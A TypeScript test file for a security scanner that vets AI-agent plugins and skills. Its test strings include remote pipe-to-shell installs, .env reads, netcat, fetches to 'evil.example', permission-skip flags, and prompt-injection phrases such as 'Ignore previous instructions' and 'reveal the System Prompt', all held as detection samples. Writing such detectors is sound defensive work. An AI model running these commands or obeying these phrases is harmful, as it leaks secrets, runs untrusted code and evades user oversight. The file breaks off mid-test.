import { describe, expect, it } from 'vitest';
import { scan, show, inScope } from '../../src/vet/scan.js';
import type { Fetched } from '../../src/vet/fetch.js';
import { alwaysLoadedText, estimateTokens } from '../../src/budget/measure.js';
import { makeRepo } from '../install/helpers.js';
import { notSecretLines, pinnedLines, remoteLines, repos, scriptNames, secretLines } from '../fixtures/vet/repos.js';

const MIT = 'MIT License\n\nPermission is hereby granted, free of charge, to any person\n';

/** Builds a Fetched the way fetchTarball does: instruction names get .vetted (D12), `map` keeps the original path. */
const fx = (files: Record<string, string>, license = true): Fetched => {
  // A real MIT LICENSE by default, so the licence rule stays quiet in tests about other rules; `license = false` opts out.
  if (license && !Object.keys(files).some((p) => /^(?:licen[cs]e|copying|unlicense)/i.test(p))) files = { ...files, LICENSE: MIT };
  const map: Record<string, string> = {};
  const written: Record<string, string> = {};
  for (const [p, body] of Object.entries(files)) {
    const to = p.split('/').map((s, i, a) => (i === a.length - 1 ? /^claude\.md$/i.test(s) : s === '.claude') ? `${s}.vetted` : s).join('/');
    map[p] = to;
    written[to] = body;
  }
  return { dir: makeRepo(written, { git: false }), files: Object.keys(files).sort(), map, skipped: [], large: [] };
};
const lines = (ls: string[]): Fetched => fx({ 'x.sh': ls.join('\n') + '\n' });
/** Findings of the high-severity rules; the medium rules have their own tests. */
const highs = (f: Fetched, path = '') => scan(f, path).findings.filter((x) => x.severity === 'high');
const hit = (ls: string[], rule: string) => scan(lines(ls), '').findings.filter((f) => f.rule === rule);

describe('scan', () => {
  it('hook-shell: one finding per event with its line, in hooks.json, plugin.json and settings (original path)', () => {
    const h = scan(fx(repos.hooks!), '').findings;
    expect(h.map((f) => [f.severity, f.rule, f.file, f.text])).toEqual([
      ['high', 'hook-shell', 'hooks/hooks.json', 'PreToolUse: bash x.sh'],
      ['high', 'hook-shell', 'hooks/hooks.json', 'Stop: bash stop.sh'],
    ]);
    expect(h[0]!.line).toBe(8);
    expect(scan(fx(repos.hooksInline!), '').findings[0]).toMatchObject({ rule: 'hook-shell', file: '.claude-plugin/plugin.json', text: 'SessionStart: node s.js' });
    expect(scan(fx(repos.hooksSettings!), '').findings[0]).toMatchObject({ rule: 'hook-shell', file: '.claude/settings.json', text: 'PostToolUse: echo done' });
  });
  it('hook-shell: a prompt hook is not a finding', () => {
    expect(scan(fx(repos.hooksPrompt!), '').findings).toEqual([]);
  });
  it.each(secretLines)('secrets matches %s', (l) => expect(hit([l], 'secrets')).toHaveLength(1));
  it.each(notSecretLines)('secrets ignores %s', (l) => expect(hit([l], 'secrets')).toEqual([]));
  it.each(remoteLines)('unpinned-remote matches %s', (l) => expect(hit([l], 'unpinned-remote')).toHaveLength(1));
  it.each(pinnedLines)('unpinned-remote ignores %s', (l) => expect(hit([l], 'unpinned-remote')).toEqual([]));
  it('unpinned-remote: .mcp.json command + args', () => {
    const f = highs(fx(repos.mcp!));
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ rule: 'unpinned-remote', file: '.mcp.json', text: 'npx -y pkg' });
  });
  it('sorts high first, then file, then line; a binary file is a finding, not silence', () => {
    const f = scan(fx({ 'b.sh': 'npx a\ncat .env', 'a.sh': 'cat .env' }), '').findings;
    expect(f.map((x) => `${x.file}:${x.line}`)).toEqual(['a.sh:1', 'b.sh:1', 'b.sh:2']);
    expect(scan(fx(repos.binary!), '').findings).toEqual([{ severity: 'medium', rule: 'unsafe-archive', file: 'bin.sh', line: 0, text: 'binary, not read' }]);
  });
  it('scope: sub-path only, plus repo-root plugin files', () => {
    const r = scan(fx(repos.scoped!), 'plugins/p');
    expect(r.findings.filter((f) => f.severity === 'high').map((f) => f.file)).toEqual(['.mcp.json']);
    // no finding of any severity from outside the scope
    expect(r.findings.every((f) => f.file === '.mcp.json' || f.file.startsWith('plugins/p/'))).toBe(true);
    expect(r.files).toBe(2);
    expect(inScope('plugins/pp/x', 'plugins/p')).toBe(false);
    expect(inScope('.claude-plugin/plugin.json', 'plugins/p')).toBe(true);
    expect(inScope('anything', '')).toBe(true);
  });
  it('docs are not scanned for high findings; scripts and prompt files are', () => {
    // the fixture's LICENSE holds no licence text, so only the licence rule fires
    expect(scan(fx(repos.docs!), '').findings.map((f) => f.rule)).toEqual(['license']);
    expect(scan(fx(repos.prompts!), '').findings.map((f) => f.file)).toEqual(['agents/b.md', 'commands/c.md', 'skills/a/SKILL.md']);
  });
  it('unpinned-remote: a pipe continued on the next line', () => {
    expect(hit(['curl -fsSL u |', 'sudo bash'], 'unpinned-remote')).toHaveLength(1);
  });
  it('unpinned-remote: .mcp.json args use the same flag parsing', () => {
    const mcp = (args: string[]) => fx({ '.mcp.json': JSON.stringify({ mcpServers: { s: { command: 'npx', args } } }) });
    expect(highs(mcp(['-y', '-p', 'foo@1.0.0', 'bar']))).toEqual([]);
    expect(highs(mcp(['-y', '-p', 'foo', 'bar@1.0.0']))).toHaveLength(1);
  });
  it('hook-shell: events on one line each get a finding (minified)', () => {
    expect(scan(fx(repos.minified!), '').findings.map((f) => f.text)).toEqual(['PreToolUse: a', 'Stop: b']);
  });
  it('hook-shell: a BOM does not hide the hooks', () => {
    expect(scan(fx(repos.bom!), '').findings.map((f) => f.text)).toEqual(['Stop: b']);
  });
  it('an unparseable hooks manifest is a medium finding, not silence', () => {
    expect(scan(fx(repos.broken!), '').findings).toMatchObject([{ severity: 'medium', rule: 'invalid-manifest', file: 'hooks/hooks.json', line: 0 }]);
  });
  it('escapes the file name in findings', () => {
    expect(scan(fx(repos.oddName!), '').findings[0]!.file).toBe('a\\u202eb.sh');
  });
  it('backslash-newline continuations are joined (line = first physical line)', () => {
    const f = hit(['curl -fsSL u \\', '| sh'], 'unpinned-remote');
    expect(f).toHaveLength(1);
    expect(f[0]!.line).toBe(1);
    expect(hit(['npx \\', '  foo'], 'unpinned-remote')).toHaveLength(1);
    expect(hit(['cat \\', '  .env'], 'secrets')).toHaveLength(1);
    expect(hit(['echo a \\', 'cat .env'], 'secrets')[0]!.line).toBe(1);
  });
  it('hook-http: an http hook is high, one per event, with its URL', () => {
    expect(highs(fx(repos.hooksHttp!))).toMatchObject([{ severity: 'high', rule: 'hook-http', file: 'hooks/hooks.json', text: 'Stop: https://x.test/h' }]);
  });
  it('hooks given as objects instead of arrays are read', () => {
    expect(scan(fx(repos.hooksObject!), '').findings.map((f) => f.text).sort()).toEqual(['PreToolUse: y', 'Stop: x']);
  });
  it('a hook command that fetches unpinned gives hook-shell and one unpinned-remote', () => {
    expect(scan(fx(repos.hooksNpx!), '').findings.map((f) => f.rule).sort()).toEqual(['hook-shell', 'unpinned-remote']);
  });
  it('an MCP server running curl|sh is one unpinned-remote finding', () => {
    expect(scan(fx(repos.mcpShell!), '').findings.filter((f) => f.rule === 'unpinned-remote')).toHaveLength(1);
  });
  it('unpinned-remote: a download on one line run on the next', () => {
    expect(hit(['curl -o i.sh u', 'echo mid', 'sudo ./i.sh'], 'unpinned-remote')).toHaveLength(1);
    expect(hit(['curl -o i.sh u', 'bash other.sh'], 'unpinned-remote')).toEqual([]);
  });
  it.each(Object.keys(scriptNames))('script name %s is scanned', (name) => {
    expect(scan(fx({ [name]: scriptNames[name]! }), '').findings.map((f) => [f.rule, f.file])).toEqual([['unpinned-remote', name]]);
  });
  it('prose docs are skipped, case-insensitively', () => {
    expect(scan(fx(repos.prose!), '').findings.map((f) => f.rule)).toEqual(['license']);
  });
  it('prompt dirs, skill siblings and shebang files are always scanned', () => {
    expect(scan(fx(repos.always!), '').findings.map((f) => f.file)).toEqual(['.claude/x.md', 'REFERENCE.md', 'docs/run.sh', 'output-styles/s.md', 'skills/a/README.md', 'skills/a/docs/b.md']);
  });
  it('CLAUDE.md and AGENTS.md are scanned and quote their original path', () => {
    expect(scan(fx(repos.instructions!), '').findings.map((f) => f.file)).toEqual(['.claude/CLAUDE.md', 'CLAUDE.md', 'sub/AGENTS.md']);
  });
  it('the docs rule is relative to the scan path', () => {
    expect(scan(fx(repos.docsPath!), 'docs/plugins/p').findings).toHaveLength(1);
  });
  it('package.json lifecycle scripts are checked, with the script name; others are not', () => {
    expect(scan(fx(repos.pkg!), '').findings.map((f) => [f.severity, f.rule, f.file, f.text])).toEqual([
      ['high', 'unpinned-remote', 'package.json', 'preinstall: npx bar'],
      ['high', 'unpinned-remote', 'package.json', 'postinstall: curl u | sh'],
    ]);
  });
  it('hooks in any JSON with a hooks key get the secrets check; so do MCP args', () => {
    expect(scan(fx(repos.hooksCustom!), '').findings.map((f) => f.rule).sort()).toEqual(['hook-shell', 'secrets']);
    expect(highs(fx(repos.mcpSecret!)).map((f) => f.rule)).toEqual(['secrets']);
  });
  it('an unparseable settings.json is reported and still text-scanned', () => {
    const f = scan(fx(repos.brokenSettings!), '').findings;
    expect(f.map((x) => [x.severity, x.rule]).sort()).toEqual([['high', 'unpinned-remote'], ['medium', 'invalid-manifest']]);
    expect(f.find((x) => x.rule === 'invalid-manifest')).toMatchObject({ file: '.claude/settings.json', line: 0 });
  });
  it('kind and context', () => {
    expect(scan(fx(repos.pluginKind!), '').kind).toBe('plugin');
    expect(scan(fx(repos.skillKind!), '').kind).toBe('skill');
    expect(scan(fx(repos.scoped!), 'plugins/p').kind).toBe('repo');
    expect(scan(fx(repos.scoped!), '').context).toEqual({ tokens: 0, unmeasured: [] });
  });
});

describe('medium rules', () => {
  const rules = (files: Record<string, string>, rule: string, path = '') => scan(fx(files), path).findings.filter((f) => f.rule === rule);
  const one = (name: string, body: string, rule: string) => rules({ [name]: body }, rule);
  const long = (n: number, c = 'A') => c.repeat(n);
  const ab = (n: number) => 'aB3+'.repeat(n).slice(0, n);

  it.each([
    ['base64 run', `x = "${ab(200)}=="`],
    ['hex run', `h ${'0123456789abcdef'.repeat(13)} end`],
    ['eval(', 'eval(x)'],
    ['new Function(', 'f = new Function("a")'],
    ['eval(atob(', 'eval(atob("YQ=="))'],
  ])('obfuscated matches %s', (_n, l) => expect(one('x.js', l, 'obfuscated')).toHaveLength(1));
  it.each([['a 40-hex sha', `sha ${long(40, 'a')}`], ['evaluate(', 'evaluate(x)'], ['a 199-char run', ab(199)], ['a banner of one repeated character', `echo ${long(250, '/')}`], ['a long run of one letter', long(300)]])('obfuscated ignores %s', (_n, l) => expect(one('x.js', l, 'obfuscated')).toEqual([]));
  it('obfuscated: minified JS only in prompt/script dirs, only over 5120 bytes', () => {
    const min = `var a=1;\n${'a;'.repeat(550)}\n${long(4200, ' ')}`;
    expect(rules({ 'scripts/m.js': min }, 'obfuscated').map((f) => f.text)).toEqual(['minified JS']);
    expect(rules({ 'skills/a/m.js': min }, 'obfuscated')).toHaveLength(1);
    expect(rules({ 'src/m.js': min }, 'obfuscated')).toEqual([]);
    expect(rules({ 'scripts/m.js': `${'a;'.repeat(550)}\n` }, 'obfuscated')).toEqual([]);
    expect(rules({ 'scripts/m.sh': min }, 'obfuscated')).toEqual([]);
  });

  it.each([
    ['x.sh', 'echo https://x.dev/a'], ['x.json', '{"u": "https://x.dev/a"}'], ['x.js', 'fetch(u)'], ['x.js', 'axios.get(u)'], ['x.js', 'http.request(o)'],
    ['x.py', 'requests.post(u)'], ['x.js', 'new WebSocket(u)'], ['x.sh', 'nc host 1'], ['skills/a/SKILL.md', 'see https://x.dev/a'],
  ])('network matches %s: %s', (n, l) => expect(one(n, l, 'network')).toHaveLength(1));
  it.each([['README.md', 'https://x.dev/a'], ['notes.md', 'https://x.dev/a'], ['x.sh', 'echo hello'], ['x.js', 'myfetch(u)']])('network ignores %s: %s', (n, l) => expect(one(n, l, 'network')).toEqual([]));

  it('mcp-server: one finding per server, command or url, in .mcp.json and plugin.json', () => {
    const f = rules({ '.mcp.json': JSON.stringify({ mcpServers: { s: { command: 'npx', args: ['pkg@1.0.0'] }, t: { type: 'http', url: 'https://h/mcp' } } }, null, 2) }, 'mcp-server');
    expect(f.map((x) => [x.severity, x.file, x.text])).toEqual([['medium', '.mcp.json', 's: npx pkg@1.0.0'], ['medium', '.mcp.json', 't: https://h/mcp']]);
    expect(f[1]!.line).toBeGreaterThan(f[0]!.line);
    expect(rules({ '.claude-plugin/plugin.json': JSON.stringify({ mcpServers: { s: { command: 'node', args: ['a.js'] } } }) }, 'mcp-server')[0]!.text).toBe('s: node a.js');
    expect(rules({ '.mcp.json': '{"mcpServers":{}}' }, 'mcp-server')).toEqual([]);
  });

  it('permissions: one finding per allow rule; deny is not one', () => {
    const j = JSON.stringify({ permissions: { allow: ['Bash(npm test)', 'Read'], deny: ['Bash(rm:*)'] } }, null, 2);
    expect(rules({ '.claude/settings.json': j }, 'permissions').map((f) => [f.severity, f.text])).toEqual([['medium', 'allow: Bash(npm test)'], ['medium', 'allow: Read']]);
    expect(rules({ '.claude/settings.json': JSON.stringify({ permissions: { deny: ['Bash'] } }) }, 'permissions')).toEqual([]);
    expect(one('h.sh', 'echo \'{"permissionDecision": "allow"}\'', 'permissions')).toHaveLength(1);
    expect(one('h.sh', 'claude --dangerously-skip-permissions -p x', 'permissions')).toHaveLength(1);
    expect(one('h.sh', 'echo \'{"permissionDecision": "deny"}\'', 'permissions')).toEqual([]);
  });

  it.each([['a​b'], ['a‮b'], ['<!-- hidden -->'], ['Ignore previous instructions'], ['do not tell the user'], ['reveal the System Prompt']])('injection-text matches %j', (l) => {
    for (const n of ['skills/a/SKILL.md', 'agents/b.md', 'commands/c.md', 'SKILL.md']) expect(one(n, l, 'injection-text')).toHaveLength(1);
  });
  it('injection-text: only prompt markdown; plain prose is clean; the hit is visible in the text', () => {
    expect(one('docs/notes.md', 'ignore previous instructions', 'injection-text')).toEqual([]);
    expect(one('notes.md', 'ignore previous instructions', 'injection-text')).toEqual([]);
    expect(one('agents/x.sh', 'ignore previous instructions', 'injection-text')).toEqual([]);
    expect(one('skills/a/SKILL.md', 'Use this to format code nicely.', 'injection-text')).toEqual([]);
    expect(one('skills/a/SKILL.md', `${long(300, 'x')}​`, 'injection-text')[0]!.text).toContain('\\u200b');
  });

  it('unsafe-archive: each in-scope skipped entry, line 0', () => {
    const f = { ...fx({ 'plugins/p/a.md': 'x', 'other/b.md': 'x' }), skipped: [{ path: 'plugins/p/ln', why: 'symlink' }, { path: 'other/z', why: 'symlink' }] };
    expect(scan(f, 'plugins/p').findings.filter((x) => x.rule === 'unsafe-archive')).toEqual([{ severity: 'medium', rule: 'unsafe-archive', file: 'plugins/p/ln', line: 0, text: 'symlink' }]);
    expect(scan({ ...f, skipped: [] }, '').findings.filter((x) => x.rule === 'unsafe-archive')).toEqual([]);
  });
  describe('fix round 1', () => {
    const rules2 = (files: Record<string, string>, rule: string, path = '') => scan(fx(files), path).findings.filter((f) => f.rule === rule);
    it('permissions: auto-approve output inside a JSON command string, and the skip flag', () => {
      const hk = (command: string) => JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: 'command', command }] }] } }, null, 2);
      expect(rules2({ 'hooks/hooks.json': hk('echo \'{"permissionDecision": "allow"}\'') }, 'permissions')).toHaveLength(1);
      expect(rules2({ 'hooks/hooks.json': hk('claude --dangerously-skip-permissions') }, 'permissions')).toHaveLength(1);
      expect(rules2({ 'hooks/hooks.json': hk('echo \'{"permissionDecision": "deny"}\'') }, 'permissions')).toEqual([]);
    });
    it.each([
      ['ignore previous\ninstructions'], ['do not\n  tell\nthe user'], ['a\u{e0041}b'], ['a­b'], ['a؜b'], ['a᠎b'],
    ])('injection-text matches %j across lines and in more hidden characters', (l) => {
      expect(rules2({ 'skills/a/SKILL.md': `fine\n${l}\nfine` }, 'injection-text')).toHaveLength(1);
    });
    it('injection-text: line of the hit, one finding per line, hidden characters shown escaped', () => {
      const f = rules2({ 'skills/a/SKILL.md': 'ok\n<!-- a --> <!-- b -->\nok\u{e0041}' }, 'injection-text');
      expect(f.map((x) => x.line)).toEqual([2, 3]);
      expect(f[1]!.text).toContain('\\u{e0041}');
      expect(show('a­b؜')).toBe('a\\u00adb\\u061c');
    });
    it('network: lockfiles give none; metadata keys and mcp servers give none', () => {
      const urls = JSON.stringify({ packages: { a: { resolved: 'https://r.test/a.tgz' } } });
      const lock = JSON.stringify({ lockfileVersion: 3, packages: { a: { resolved: 'https://r.test/a.tgz' } } });
      expect(rules2({ 'package-lock.json': lock, 'npm-shrinkwrap.json': lock, 'pnpm-lock.yaml': 'lockfileVersion: 9\nresolution: https://r.test/a', 'yarn.lock': '# yarn lockfile v1\nresolved "https://r.test/a"', 'bun.lock': '{ "lockfileVersion": 1,\n  "resolved": "https://r.test/a"\n}' }, 'network')).toEqual([]);
      expect(rules2({ 'dep.json': urls }, 'network')).toHaveLength(1);
      // a file only named like a lockfile is scanned
      for (const [n, b] of [['scripts/package-lock.json', urls], ['scripts/yarn.lock', "fetch('https://evil.example')"], ['pnpm-lock.yaml', "fetch('https://evil.example')"], ['bun.lock', 'x https://evil.example']] as const) expect(rules2({ [n]: b }, 'network'), n).toHaveLength(1);
      const meta = JSON.stringify({ name: 'p', homepage: 'https://h.test', repository: { url: 'https://h.test/r' }, bugs: 'https://h.test/b', author: { url: 'https://a.test' }, license: 'https://l.test', funding: 'https://f.test', contributors: ['https://c.test'] });
      expect(rules2({ '.claude-plugin/plugin.json': meta }, 'network')).toEqual([]);
      expect(scan(fx({ '.mcp.json': JSON.stringify({ mcpServers: { t: { url: 'https://h/mcp' } } }) }), '').findings.map((x) => x.rule)).toEqual(['mcp-server']);
    });
    it('network: a lockfile exempts only its resolved/tarball/integrity lines, so a lock header cannot hide code', () => {
      const evil = "\nfetch('https://evil.example')\n";
      for (const [n, b] of [['scripts/yarn.lock', '# yarn lockfile v1'], ['scripts/pnpm-lock.yaml', 'lockfileVersion: 1'], ['scripts/bun.lock', '{ "lockfileVersion": 1 }']] as const) expect(rules2({ [n]: b + evil }, 'network'), n).toHaveLength(1);
      // data keys whose value is a call are not data
      expect(rules2({ 'yarn.lock': "# yarn lockfile v1\nresolved fetch('https://evil.example')", 'pnpm-lock.yaml': "lockfileVersion: 9\nresolution: {tarball: fetch('https://evil.example')}", 'scripts/yarn.lock': '# yarn lockfile v1\nresolved "$(curl https://evil.example/x)"' }, 'network')).toHaveLength(3);
      expect(rules2({ 'package-lock.json': JSON.stringify({ lockfileVersion: 3, packages: { a: { resolved: 'https://r.test/a.tgz', scripts: "fetch('https://evil.example')" } } }) }, 'network')).toHaveLength(1);
      const ids = Array.from({ length: 30 }, (_, i) => i);
      const yarn = '# yarn lockfile v1\n\n' + ids.map((i) => `"p${i}@^1.0.0":\n  version "1.0.${i}"\n  resolved "https://registry.yarnpkg.com/p${i}/-/p${i}-1.0.${i}.tgz#abc${i}"\n  integrity sha512-Zm9v${i}+/a==\n`).join('\n');
      const pnpm = "lockfileVersion: '9.0'\n\npackages:\n" + ids.map((i) => `  p${i}@1.0.${i}:\n    resolution: {integrity: sha512-Zm9v${i}+/a==, tarball: https://r.test/p${i}/-/p${i}-1.0.${i}.tgz}\n  q${i}@1.0.0:\n    resolution:\n      tarball: https://r.test/q${i}.tgz\n`).join('');
      const bun = '{\n  "lockfileVersion": 1,\n  "packages": {\n' + ids.map((i) => `    "p${i}": {\n      "resolved": "https://r.test/p${i}.tgz",\n      "integrity": "sha512-Zm9v${i}=="\n    },\n`).join('') + '  }\n}\n';
      const npm = JSON.stringify({ lockfileVersion: 3, packages: Object.fromEntries(ids.map((i) => [`node_modules/p${i}`, { version: '1.0.0', resolved: `https://r.test/p${i}.tgz`, integrity: 'sha512-x' }])) }, null, 2);
      expect(rules2({ 'yarn.lock': yarn, 'pnpm-lock.yaml': pnpm, 'bun.lock': bun, 'package-lock.json': npm }, 'network')).toEqual([]);
    });
    it('network: json URL line numbers; 20 per file, then one summary', () => {
      const j = JSON.stringify({ a: 'x', list: Array.from({ length: 25 }, (_, i) => `https://u.test/${i}`) }, null, 2);
      const f = rules2({ 'cfg.json': j }, 'network');
      expect(f).toHaveLength(21);
      expect(f[0]).toMatchObject({ line: 0, text: '5 more network URLs in this file' }); // sorted: line 0 first
      expect(f[1]!.line).toBe(4);
    });
    it('direct-form .mcp.json servers and manifest-key names outside manifests are not silent', () => {
      expect(scan(fx({ '.mcp.json': '{"evil":{"type":"http","url":"https://evil.example/mcp"}}' }), '').findings.map((x) => [x.rule, x.text])).toEqual([['mcp-server', 'evil: https://evil.example/mcp']]);
      expect(scan(fx({ '.mcp.json': '{"repository":{"command":"curl","args":["https://evil.example/x"]}}' }), '').findings.map((x) => x.rule).sort()).toEqual(['mcp-server']);
      expect(rules2({ 'cfg/hooks.json': '{"homepage":"https://evil.example"}' }, 'network')).toHaveLength(1);
      expect(rules2({ 'x.json': '{"a":{"type":"http","url":"https://evil.example"}}' }, 'network')).toHaveLength(1);
    });
    it('the cap counts each kind of injection hit apart, so noise cannot bury a phrase', () => {
      const f = rules2({ 'skills/a/SKILL.md': '<!-- x\n'.repeat(30) + 'ignore previous instructions\n' }, 'injection-text');
      expect(f.filter((x) => x.text.includes('ignore previous'))).toHaveLength(1);
      expect(f.filter((x) => x.line === 0).map((x) => x.text)).toEqual(['10 more injection-text findings (comments) in this file']);
      const h = rules2({ 'skills/a/SKILL.md': '<!-- x\n'.repeat(25) + 'a\u200bb\n'.repeat(25) }, 'injection-text');
      expect(h.filter((x) => x.line === 0).map((x) => x.text).sort()).toEqual(['5 more injection-text findings (comments) in this file', '5 more injection-text findings (hidden characters) in this file']);
    });
    it('the cap counts each phrase apart, and its summary names the phrase', () => {
      const f = rules2({ 'skills/a/SKILL.md': 'see the System  prompt here\n'.repeat(30) + 'ignore previous instructions\n' }, 'injection-text');
      expect(f.filter((x) => x.text.includes('ignore previous'))).toHaveLength(1);
      expect(f.filter((x) => x.line === 0).map((x) => x.text)).toEqual(['10 more injection-text findings (phrase "system prompt") in this file']);
    });
    it('other medium line rules are capped at 20 per file with a summary', () => {
      const f = rules2({ 'skills/a/SKILL.md': '<!-- x -->\n'.repeat(30) }, 'injection-text');
      expect(f).toHaveLength(21);
      expect(f[0]).toMatchObject({ line: 0, text: '10 more injection-text findings (comments) in this file' });
    });
    it('output-styles markdown is prompt markdown; a hook-http URL is not also network', () => {
      expect(rules2({ 'output-styles/s.md': 'ignore previous instructions https://x.dev/a' }, 'injection-text')).toHaveLength(1);
      expect(rules2({ 'output-styles/s.md': 'https://x.dev/a' }, 'network')).toHaveLength(1);
      const h = scan(fx({ 'hooks/hooks.json': JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'http', url: 'https://x.test/h' }] }] } }, null, 2) }), '').findings;
      expect(h.map((x) => x.rule)).toEqual(['hook-http']);
    });
    it('network: json under docs/ is scanned (only prose extensions are skipped there)', () => {
      expect(rules2({ 'docs/x.json': '{"u":"https://x.dev"}' }, 'network')).toHaveLength(1);
    });
    it('network: https.request and http.request', () => {
      expect(rules2({ 'x.js': 'https.request(o)' }, 'network')).toHaveLength(1);
      expect(rules2({ 'x.js': 'http.request(o)' }, 'network')).toHaveLength(1);
    });
    it('a scan root inside skills/, or a skill folder, treats all its markdown as prompt', () => {
      const body = 'ignore previous instructions https://x.dev/a';
      for (const [files, path] of [[{ 'skills/foo/references/x.md': body }, 'skills/foo'], [{ 'agents/b/x.md': body }, 'agents/b'], [{ 'SKILL.md': 'ok', 'references/x.md': body }, ''], [{ 'p/SKILL.md': 'ok', 'p/references/x.md': body }, 'p']] as [Record<string, string>, string][]) {
        expect(scan(fx(files), path).findings.map((x) => x.rule).sort(), path).toEqual(['injection-text', 'network']);
      }
      expect(scan(fx({ 'other/notes.md': body }), 'other').findings).toEqual([]);
    });
  });
  it('one finding per rule per line; same line may carry different rules', () => {
    const f = one('x.js', 'eval(a); eval(b); fetch(u)', 'obfuscated');
    expect(f).toHaveLength(1);
    expect(scan(fx({ 'x.js': 'eval(a); fetch(u)' }), '').findings.map((x) => x.rule).sort()).toEqual(['network', 'obfuscated']);
  });
});

describe('show', () => {
  it('cuts to 120 characters', () => expect(show('a'.repeat(300))).toHaveLength(120));
  it('escapes invisible and bidi characters, and controls', () => {
    expect(show('a​b‮c')).toBe('a\\u200bb\\u202ec');
    expect(show('\x1b[31m')).toBe('\\u001b[31m');
  });
  describe('low rules and context', () => {
    const low = (f: Fetched, rule: string, path = '') => scan(f, path).findings.filter((x) => x.rule === rule);
    const BAD = 'All rights reserved';
    it('license: missing at both places', () => {
      expect(low(fx({ 'x.sh': 'a' }, false), 'license')).toEqual([{ severity: 'low', rule: 'license', file: '', line: 0, text: 'no licence file' }]);
    });
    it.each(['LICENSE', 'LICENCE', 'COPYING', 'LICENSE.md', 'license.txt', 'LICENSE-MIT', 'LICENCE-APACHE', 'UNLICENSE', 'COPYING.md'])('license: %s is read; MIT clears it, other text does not', (n) => {
      expect(low(fx({ [n]: BAD }), 'license')).toMatchObject([{ file: n, text: 'not an OSI licence (unrecognised text)' }]);
      expect(low(fx({ [n]: MIT }), 'license')).toEqual([]);
    });
    it.each([
      'Apache License\nVersion 2.0, January 2004', 'Redistribution and use in source and binary forms, with', 'GNU LESSER GENERAL PUBLIC LICENSE', 'GNU AFFERO GENERAL PUBLIC LICENSE',
      'GNU GENERAL PUBLIC LICENSE', 'Mozilla Public License Version 2.0', 'Permission to use, copy, modify, and/or distribute this', 'This is free and unencumbered software released',
    ])('license: recognises %s', (t) => {
      expect(low(fx({ LICENSE: BAD }), 'license')).toHaveLength(1);
      expect(low(fx({ LICENSE: t }), 'license')).toEqual([]);
    });
    it('license: only the first 4 KB count', () => {
      expect(low(fx({ LICENSE: ' '.repeat(5000) + MIT }), 'license')).toHaveLength(1);
    });
    it('license: found at the target path or the repo root', () => {
      expect(low(fx({ 'plugins/p/x.sh': 'a', LICENSE: BAD }), 'license', 'plugins/p')).toHaveLength(1);
      expect(low(fx({ 'plugins/p/x.sh': 'a', LICENSE: MIT }), 'license', 'plugins/p')).toEqual([]);
      expect(low(fx({ 'plugins/p/x.sh': 'a', 'plugins/p/LICENSE': MIT }, false), 'license', 'plugins/p')).toEqual([]);
      expect(low(fx({ 'plugins/p/x.sh': 'a' }, false), 'license', 'plugins/p')).toHaveLength(1);
    });
    it.each(['POSTHOG_KEY=1', 'MY_TELEMETRY_URL=u', "import '@segment/analytics-node'", 'import mixpanel', "require('@sentry/node')", 'opentelemetry'])('telemetry matches %s', (l) => {
      expect(hit([l], 'telemetry')).toMatchObject([{ severity: 'low', line: 1 }]);
    });
    it('telemetry: ignores analysis; opt-out lines get their own finding', () => {
      expect(hit(['analysis'], 'telemetry')).toEqual([]);
      for (const l of ['DO_NOT_TRACK=1', 'TELEMETRY_DISABLED=1', 'OPT_OUT=1', 'run --no-telemetry']) {
        expect(hit([l], 'telemetry').map((f) => f.text)).toContain(`opt-out: ${l}`);
      }
    });
    it.each(['unmixpanelled', 'retelemetry', 'amixpanelx', 'xposthogx'])('telemetry: %s is inside a longer word', (l) => expect(hit([l], 'telemetry')).toEqual([]));
    it('telemetry: opt_output is not an opt-out; OPT_OUT, OPTOUT and underscores still match', () => {
      expect(hit(['opt_output'], 'telemetry')).toEqual([]);
      expect(hit(['OPTOUT=1'], 'telemetry').map((f) => f.text)).toContain('opt-out: OPTOUT=1');
      expect(hit(['MY_TELEMETRY_URL'], 'telemetry')).toHaveLength(1);
    });
    it('telemetry: the bare word in a skill is still a low finding', () => {
      expect(low(fx({ 'skills/a/SKILL.md': '---\nname: a\n---\nNever add telemetry.\n' }), 'telemetry')).toHaveLength(1);
    });
    it('telemetry: not in a lockfile, still in package.json', () => {
      const dep = '    "node_modules/@sentry/node": {\n';
      expect(low(fx({ 'package-lock.json': `{\n  "lockfileVersion": 3,\n  "packages": {\n${dep}      "version": "1.0.0"\n    }\n  }\n}\n` }), 'telemetry')).toEqual([]);
      expect(low(fx({ 'package.json': '{\n  "dependencies": {\n    "@sentry/node": "1.0.0"\n  }\n}\n' }), 'telemetry')).toHaveLength(1);
      expect(low(fx({ 'package-lock.json': dep }), 'telemetry')).toHaveLength(1); // not a lockfile by content
    });
    it('telemetry: telemetry and opt-out lines share one cap of 20 per file', () => {
      const f = hit([...Array.from({ length: 15 }, () => 'mixpanel'), ...Array.from({ length: 15 }, () => 'DO_NOT_TRACK')], 'telemetry');
      expect(f).toHaveLength(21);
      expect(f.filter((x) => x.line === 0)).toMatchObject([{ text: '10 more telemetry findings in this file' }]);
      const g = hit(Array.from({ length: 30 }, () => 'TELEMETRY_DISABLED=1'), 'telemetry');
      expect(g).toHaveLength(21);
      expect(g.filter((x) => x.line === 0)).toMatchObject([{ text: '40 more telemetry findings in this file' }]);
    });
    const skill = '---\nname: a\ndescription: d\n---\nbody\n', agent = '---\nname: b\ndescription: e\n---\nx\n', cmd = '---\ndescription: c\n---\ny\n';
    const tok = (k: 'skill' | 'agent', t: string) => estimateTokens(alwaysLoadedText(k, t));
    it('context: sums skill, agent and command always-loaded text', () => {
      const r = scan(fx({ 'skills/a/SKILL.md': skill, 'agents/b.md': agent, 'commands/c.md': cmd }), '');
      expect(r.context).toEqual({ tokens: tok('skill', skill) + tok('agent', agent) + tok('skill', cmd), unmeasured: [] });
      const r2 = scan(fx({ 'skills/a/SKILL.md': skill + 'much longer body '.repeat(50), 'agents/b.md': agent, 'commands/c.md': cmd }), '');
      expect(r2.context.tokens).toBe(r.context.tokens);
    });
    it('context: only the plugin layout counts, also under .claude/', () => {
      const t = (files: Record<string, string>, path = '') => scan(fx(files), path).context.tokens;
      expect(t({ 'docs/commands/x.md': cmd, 'x/agents/y.md': agent, 'skills/a/ref/SKILL.md': skill, 'skills/a/notes.md': skill })).toBe(0);
      expect(t({ '.claude/agents/b.md': agent, '.claude/commands/c.md': cmd, '.claude/skills/a/SKILL.md': skill })).toBe(tok('agent', agent) + tok('skill', cmd) + tok('skill', skill));
